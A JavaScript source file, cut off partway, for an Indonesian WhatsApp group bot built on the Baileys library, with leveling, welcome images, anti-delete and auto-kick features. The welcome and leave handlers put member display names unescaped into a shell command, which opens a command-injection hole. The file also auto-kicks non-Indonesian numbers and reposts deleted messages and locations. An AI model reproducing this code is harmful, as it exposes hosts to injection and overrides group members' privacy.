const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   ChatModification,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   Browser
} = require("@adiwajshing/baileys")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const speed = require('performance-now')
const base64Img = require('base64-img')
const toMs = require('ms')
const got = require("got")
const util = require('util')
const ms = require('parse-ms')
const ytdl = require('ytdl-core')
const imgbb = require('imgbb-uploader')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const { exec } = require("child_process")
const fetch = require('node-fetch')
const request = require('request')
const crypto = require('crypto')
const axios = require('axios')
const qrcodes = require("qrcode")
const qrcode = require("qrcode-terminal")
const os = require('os')
const ID3Writer = require('browser-id3-writer')
const ytsr = require('ytsr')
const yts = require( 'yt-search')
const cheerio = require('cheerio')
const { Utils_1 } = require('./node_modules/@adiwajshing/baileys/lib/WAConnection/Utils')
const FormData = require('form-data')
const fs = require("fs")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const tik = require('tiktok-scraper-without-watermark')
const { recognize } = require('./lib/ocr')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { ytplay, ytdldown } = require('./lib/ytdownload')
const { fetchJson } = require('./lib/fetcher')
const { dla } = require('./language')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { uploadimg } = require('./lib/uploadimg')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const setting = JSON.parse(fs.readFileSync('./dns/setting.json'))
const {
	color,
	bgcolor
} = require('./lib/color')
const {
	simih,
	getBuffer,
	getGroupAdmins,
	getRandom,
	banner,
	start,
	info,
	success,
	close
} = require('./lib/functions')
//Load Json

/*
SETTINGS
*/
botName = setting.botName
ytName = setting.ytName
igName = setting.igName
grupLink = setting.grupLink
igLink = setting.igLink
ytLink = setting.ytLink
ownerName = setting.ownerName
kontakName = setting.kontakName
kontakORG = setting.kontakORG
vhtear = setting.vhtear
xteam = setting.xteam
limitawal = setting.limitawal
memberlimit = setting.memberlimit
cr = setting.cr
const owner = setting.owner
blocked = []
self = true
kuis = false
no = 1
numbernye = '0'
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${kontakName}\n`
            + `ORG:${kontakORG};\n`
            + `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
            + 'END:VCARD'
/*
SETTINGS
*/
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/badword.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const event = JSON.parse(fs.readFileSync('./database/event.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const _samih = JSON.parse(fs.readFileSync('./database/simi.json'))
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const audioya = JSON.parse(fs.readFileSync('./media/audio.json'))
const imegya = JSON.parse(fs.readFileSync('./media/image.json'))
const setimker = JSON.parse(fs.readFileSync('./media/stik.json'))
const vidioya = JSON.parse(fs.readFileSync('./media/video.json'))
// End Json
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./database/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./database/level.json', JSON.stringify(_level))
	}
}

const addLevelingId = (sender) => {
	const obj = { id: sender, xp: 1, level: 1 }
	_level.push(obj)
	fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}

const getRegisteredRandomId = () => {
	return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, time, serials) => {
	const obj = { id: userid, name: sender, time: time, serial: serials }
	_registered.push(obj)
	fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
	let status = false
	Object.keys(_registered).forEach((i) => {
		if (_registered[i].id === sender) {
			status = true
		}
	})
	return status
}

const addATM = (sender) => {
	const obj = { id: sender, uang: 5 }
	uang.push(obj)
	fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
}

const addKoinUser = (sender, amount) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		uang[position].uang += amount
		fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
	}
}

const checkATMuser = (sender) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return uang[position].uang
	}
}

const bayarLimit = (sender, amount) => {
	let position = false
	Object.keys(_limit).forEach((i) => {
		if (_limit[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_limit[position].limit -= amount
		fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
	}
}

const confirmATM = (sender, amount) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		uang[position].uang -= amount
		fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
	}
}

const limitAdd = (sender) => {
	let position = false
	Object.keys(_limit).forEach((i) => {
		if (_limit[i].id == sender) {
			position = i
		}
	})
	if (position !== false) {
		_limit[position].limit += 1
		fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
	}
}

//finction
const jam = moment.tz('Asia/Jakarta').format('HH:mm')
const arrayBulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

const bulan = arrayBulan[moment().format('MM') - 1]
const time_now = moment().format('HH:mm:')
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
				var penghitungRmd = 0
			if (moment().format('MM') == 03) {
				penghitungRmd = 44
			} else if (moment().format('MM') == 04) {
				penghitungRmd = 14
			}
			let v = new Date
				let localle = 'id'
					const harinya = d.toLocaleDateString(locale, { weekday: 'long' })
				
				var ramadhan = Math.floor(penghitungRmd - moment().format('DD:HH:mm')) 
				let hri = new Date
				let localev = 'id'
					var hari= hri.toLocaleDateString(localev, { weekday: 'long' })
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
// SLEEP 
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const dnsnew = fs.readFileSync('./dns/dnsnew.jpg')
async function starts() {
	const dila = new WAConnection()
	dila.logger.level = 'warn'
	console.log(color('[SYSTEM]', 'cyan'), color('Assalamualaikum kak, Namaku Dila', 'yellow'), color('(😜)', 'white'))
	dila.on('qr', () => {
		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Scan QRnya'))
	})
	dila.on('credentials-updated', () => {
		fs.writeFileSync('./QRnya.json', JSON.stringify(dila.base64EncodedAuthInfo(), null, '\t'))
		info('2','Geeting Info')
	})
	fs.existsSync('./QRnya.json') && dila.loadAuthInfo('./QRnya.json')
	dila.on('connecting', () => {
		start('2','Connecting')
	})
	dila.on('open', () => {
		success('2','Connected')
		console.log(banner.string)
		console.log(color('[SYSTEM]', 'cyan'), color('Kalo ada bug langsung lapor ke Owner ya kak', 'yellow'), color('(😊)', 'white'))
	})
	await dila.connect({ timeoutMs: 30 * 1000 })
	
	//welcome
	dila.on('group-participants-update', async (anu) => {
	if (!welkom.includes(anu.jid)) return
	try {
		const mdata = await dila.groupMetadata(anu.jid)
		console.log(anu)
		if (anu.action == 'add') {
			myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
			myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
			var tgl = new Date();
			var day = tgl.getDate()
			var bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			const tanggalu = `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
			num = anu.participants[0]
			thu = await dila.getStatus(anu.participants[0], MessageType.text)
			membr = mdata.participants.length
			console.log(color('[SYSTEM]', 'cyan'), color('Ada orang masuk grup tuh kak, Siapa ya kak?', 'yellow'), color('(🤔)', 'white'))
			const moment = require('moment-timezone')
const jm = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
				try {
pushnem = dila.contacts[num] != undefined ? dila.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : dila.contacts[num].notify || dila.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
} catch { 
 pushnem = num.split('@')[0]
}
			try {
				ppimg = await dila.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/image/pp.jpeg'
			}
				exec(`magick './src/wel.jpg' -gravity west -fill '#000000' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-50 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+205 'Welcome To ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+60 -composite 'welcome.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			dila.sendMessage(mdata.id, fs.readFileSync('welcome.jpg'), MessageType.image, { caption: `\`\`\`Welcome In Gc ${mdata.subject}\`\`\`\n─────────────────\n\`\`\`Nama : @${num.split('@')[0]}\`\`\`\n\`\`\`Bio : ${thu.status}\`\`\`\n\`\`\`Member Ke : ${membr}\`\`\`\n\`\`\`Tanggal : ${tanggalu}\`\`\`\n\`\`\`Jangan Lupa Baca Deskripsi\`\`\`\n─────────────────\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
			})
				//leave
		} else if (anu.action == 'remove') {
			console.log(color('[SYSTEM]', 'cyan'), color('Yang keluar siapa ya kak?', 'yellow'), color('(🤔)', 'white'))
			myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
			myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
			var tgl = new Date();
			var day = tgl.getDate()
			var bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			const tanggalu = `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
		num = anu.participants[0]
		const moment = require('moment-timezone')
const jamny = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
thu = await dila.getStatus(anu.participants[0], MessageType.text)
pushnem = dila.contacts[num] != undefined ? dila.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : dila.contacts[num].notify || dila.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
			try {
				ppimg = await dila.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/image/pp.jpeg'
			}
				exec(`magick './src/lev.jpg' -gravity west -fill '000000' -font './src/font-gue.ttf' -size 1280x710 -pointsize 70 -interline-spacing 7.5 -annotate +460-50 '${pushnem}' -pointsize 35 -annotate +460+83 '${jamny} ${calender}' -pointsize 50 -annotate +460+205 'Leaving From ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+60 -composite 'leave.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			dila.sendMessage(mdata.id, fs.readFileSync('leave.jpg'), MessageType.image, { caption: `_Selamat Jalan @${num.split('@')[0]}👋🏻_\n─────────────────\n_Meninggal Pada : ${tanggalu}_\n_Kata Kata Terakhir : ${thu.status}_`, contextInfo: { mentionedJid: [num] }})
			})
		}
	} catch (e) {
		console.log(e)
	}
	})
	//antibule
	dila.on('group-participants-update', async (den) => {
	if (!kickarea.includes(den.jid)) return
		const mdata = await dila.groupMetadata(den.jid)
		console.log(den)
					num = den.participants[0]
					if (num.includes('62')) return
	     bule = `${num.split('@')[0]}`
		console.log(color('[SYSTEM]', 'cyan'), color('Ada bule masuk grup tuh kak, Dila kick ya kak', 'yellow'), color('(😁)', 'white'))
		teks= `\`\`\`@${num.split('@')[0]} , Sorry this Group is only for Indonesians\`\`\``
		dila.sendMessage(mdata.id, teks, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [num] }})
				 dila.groupRemove(den.jid, [num])
		})
    dila.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
		for (let i of json[1].blocklist) {
			blocked.push(i.replace('c.us', 's.whatsapp.net'))
		}
	})
	dila.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log(color('[SYSTEM]', 'cyan'), color(`${callerId} Dia yang telepon kakak, Dila block ya kak`, 'yellow'), color('(😌)', 'white'))
        dila.updatePresence(from, Presence.composing) 
        dila.sendMessage(callerId, `\`\`\`Auto block System!\nJika ingin membuka block harap chat Owner\nwa.me/${owner}\`\`\``, MessageType.text)
        await sleep(5000)
        await dila.blockUser(callerId, "add")
})
dila.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
	})
	dila.on('message-update', async(mek) => {
    try {
    	const from = mek.key.remoteJid
	    const messageStubType = WA_MESSAGE_STUB_TYPES[mek.messageStubType] || 'MESSAGE'
        const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
        const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
        const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
        const sender = mek.key.fromMe ? dila.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
        const isRevoke = mek.key.remoteJid.endsWith('@s.whatsapp.net') ? true : mek.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
        const isCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
        const isBanCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
        if (messageStubType == 'REVOKE') {
        	console.log(`Status untuk grup : ${!isRevoke}\nStatus semua kontak : ${!isCtRevoke}\nStatus kontak dikecualikan : ${!isBanCtRevoke}`)
            console.log(color('[SYSTEM]', 'cyan'), color('Yang hapus pesan siapa tuh kak, Xixixi', 'yellow'), color('(😆)', 'white'))
            if (!isRevoke) return
            if (!isCtRevoke) return
            if (!isBanCtRevoke) return
            const from = mek.key.remoteJid
            const isGroup = mek.key.remoteJid.endsWith('@g.us') ? true : false
            let int
            let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
            const id_deleted = mek.key.id
            const conts = mek.key.fromMe ? dila.user.jid : dila.contacts[sender] || { notify: jid.replace(/@.+/, '') }
            const pushname = mek.key.fromMe ? dila.user.name : conts.notify || conts.vname || conts.name || '-'
            const opt4tag = {
                contextInfo: { mentionedJid: [sender] }
            }
            for (let i = 0; i < infoMSG.length; i++) {
                if (infoMSG[i].key.id == id_deleted) {
                    const dataInfo = infoMSG[i]
                    const type = Object.keys(infoMSG[i].message)[0]
                    const timestamp = infoMSG[i].messageTimestamp
                    int = {
                        no: i,
                        type: type,
                        timestamp: timestamp,
                        data: dataInfo
                    }
                }
            }
            const index = Number(int.no)
            const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
            const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
            if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : Text\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\`
\`\`\`❏ Pesan : ${body ? body : '-'}\`\`\``
                dila.sendMessage(from, strConversation, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [sender] }, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { conversation: `*ANTI-DELETE*\n${pushname} , Telah Menghapus Pesan`}}})
} else if (int.type == 'stickerMessage') {
                const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                const savedFilename = await dila.downloadAndSaveMediaMessage(int.data, `./temp/${filename}`);
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : Sticker\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\``
                const buff = fs.readFileSync(savedFilename)
                const pingbro25 = { quoted: { key: { fromMe: false, participant: sender, ...(from ? { remoteJid: from} : {}) }, message:{ "stickerMessage":int.data}}}
                dila.sendMessage(from, strConversation, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [sender], forwardingScore: 508, isForwarded: true }, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { conversation: `*ANTI-DELETE*\n${pushname} , Telah Menghapus Sticker`}}})
                dila.sendMessage(from, buff, MessageType.sticker, pingbro25)
                fs.unlinkSync(savedFilename)
                } else if (int.type == 'audioMessage') {
                const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                const savedFilename = await dila.downloadAndSaveMediaMessage(int.data, `./temp/${filename}`);
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : Audio\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\``
                const buff = fs.readFileSync(savedFilename)
                const pingbro26 = { quoted: { key: { fromMe: false, participant: sender, ...(from ? { remoteJid: from} : {}) }, message:{ "audioMessage":int.data}}}
                dila.sendMessage(from, strConversation, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [sender], forwardingScore: 508, isForwarded: true }, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { conversation: `*ANTI-DELETE*\n${pushname} , Telah Menghapus Audio`}}})
                dila.sendMessage(from, buff, MessageType.audio, { mimetype: 'audio/mp4', duration: 999999999 }, pingbro26)
                fs.unlinkSync(savedFilename)
} else if (int.type == 'locationMessage') {
                const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                const savedFilename = await dila.downloadAndSaveMediaMessage(int.data, `./temp/${filename}`);
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : Location\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\``
                const buff = fs.readFileSync(savedFilename)
                const pingbro27 = { quoted: { key: { fromMe: false, participant: sender, ...(from ? { remoteJid: from} : {}) }, message:{ "locationMessage":int.data}}}
                dila.sendMessage(from, strConversation, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [sender], forwardingScore: 508, isForwarded: true }, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { conversation: `*ANTI-DELETE*\n${pushname} , Telah Menghapus Lokasi`}}})
                dila.sendMessage(from, buff, MessageType.location, pingbro27)
                fs.unlinkSync(savedFilename)
} else if (int.type == 'liveLocationMessage') {
                const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                const savedFilename = await dila.downloadAndSaveMediaMessage(int.data, `./temp/${filename}`);
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : liveLocation\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\``
                const buff = fs.readFileSync(savedFilename)
                const pingbro28 = { quoted: { key: { fromMe: false, participant: sender, ...(from ? { remoteJid: from} : {}) }, message:{ "liveLocationMessage":int.data}}}
                dila.sendMessage(from, strConversation, MessageType.text, { thumbnail: dnsnew, sendEphemeral: true, contextInfo: { mentionedJid: [sender], forwardingScore: 508, isForwarded: true }, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { conversation: `*ANTI-DELETE*\n${pushname} , Telah Menghapus Lokasi Terkini`}}})
                dila.sendMessage(from, buff, MessageType.liveLocation, pingbro28)
                fs.unlinkSync(savedFilename)
                } else if (int.type == 'imageMessage') {
                const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                const savedFilename = await dila.downloadAndSaveMediaMessage(int.data, `./temp/${filename}`);
                const buff = fs.readFileSync(savedFilename)
                const strConversation = `\`\`\`❏ Nama : @${sender.split('@')[0]}\`\`\`
\`\`\`❏ Tipe : Image\`\`\`
\`\`\`❏ Waktu : ${moment.unix(int.timestamp).format('HH:mm:ss')}\`\`\`
\`\`\`❏ Tanggal : ${moment.unix(int.timestamp).format('DD/MM/YYYY')}\`\`\`
\`\`\`❏ Pesan : ${body ? body : '-'}\`\`\``
                dila.sendMessage(from, buff, MessageType.image, { quoted: {key: {participant: `${numbernye}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `*ANTI-DELETE*\n${pushname} , Telah Menghapus Image`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}, contextInfo: { mentionedJid: [sender],forwardingScore: 508, isForwarded: true }, caption: strConversation})
                fs.unlinkSync(savedFilename)
                }
        }
    } catch (e) {
        console.log('Message : %s', color(e, 'green'))
    }
})
dila.on('message-new', async(Lan) => {
		try {
			if (!Lan.message) return
			if (Lan.key && Lan.key.remoteJid == 'status@broadcast') return
			if (Lan.key.fromMe) return
			global.prefix
			global.blocked
			global.batrei = global.batrei ? global.batrei : []
			dila.on('CB:action,,battery', json => {
		    const batteryLevelStr = json[2][0][1].value
		    const batterylevel = parseInt(batteryLevelStr)
		    global.batrei.push(batterylevel)
	        })
	        const content = JSON.stringify(Lan.message)
			const from = Lan.key.remoteJid
			const type = Object.keys(Lan.message)[0]
			const mentionUser = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
			mentionByReply = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentionUser.push(mentionByReply)
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const date = new Date().toLocaleDateString()
			const cmd = (type === 'conversation' && Lan.message.conversation) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text ? Lan.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
			const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
		    body = (type === 'conversation' && Lan.message.conversation.startsWith(prefix)) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption.startsWith(prefix) ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption.startsWith(prefix) ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text.startsWith(prefix) ? Lan.message.extendedTextMessage.text : ''
		    budy = (type === 'conversation') ? Lan.message.conversation : (type === 'extendedTextMessage') ? Lan.message.extendedTextMessage.text : ''
		    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		    const args = body.trim().split(/ +/).slice(1)
		    const isCmd = body.startsWith(prefix)
